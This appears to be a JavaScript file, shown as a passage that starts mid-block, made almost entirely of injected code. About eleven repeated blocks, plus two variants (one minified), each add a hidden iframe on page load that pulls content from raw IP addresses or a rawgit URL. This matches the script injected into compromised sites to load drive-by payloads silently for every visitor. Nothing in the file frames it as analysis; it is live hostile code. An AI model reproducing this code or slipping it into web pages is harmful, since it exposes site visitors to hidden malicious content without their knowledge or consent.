	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});